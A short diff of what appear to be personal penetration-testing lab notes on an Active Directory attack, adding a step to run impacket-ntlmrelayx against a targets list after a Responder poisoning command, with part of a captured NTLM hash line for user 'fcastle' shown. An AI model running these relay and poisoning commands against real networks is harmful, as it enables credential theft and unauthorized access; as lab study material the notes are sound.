@@ -2666,6 +2666,10 @@ fcastle::TREE:51934501eb00515e:9ABE5E3F30739166896A5BEEA3D0621F:0101000000000000
 > Run command:
 >  `sudo responder -I eth0 -Adwv`
 
+> [!todo] 
+> Run command:
+> `sudo impacket-ntlmrelayx -tf targets.txt -smb2support`  
+
 ![[Pasted image 20230311185520.png]]
 
 > [!todo] 
